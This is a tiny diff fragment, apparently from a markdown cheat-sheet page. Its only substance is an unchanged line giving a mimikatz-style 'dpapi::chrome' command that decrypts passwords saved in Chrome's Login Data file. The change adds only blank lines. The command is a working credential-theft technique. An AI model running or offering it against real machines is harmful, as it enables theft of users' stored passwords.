@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:37:19.522854+00:00'
 ```bash
 dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
 ```
+
+
